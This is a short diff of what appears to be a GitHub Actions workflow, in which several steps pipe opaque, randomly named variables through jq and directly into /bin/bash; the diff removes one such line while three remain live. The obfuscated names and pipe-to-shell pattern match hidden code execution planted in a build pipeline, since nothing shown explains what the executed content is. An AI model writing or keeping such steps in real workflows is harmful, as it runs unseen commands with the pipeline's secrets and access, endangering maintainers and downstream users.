@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$x4" | jq -r .isdeh8658 | /bin/bash
           printf '%s' "$bocl7" | jq -r .wfbbn307 | /bin/bash
           printf '%s' "$fdgpq8" | jq -r .xqvw7140 | /bin/bash
-          echo $i24 | jq -r .orkw52218 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
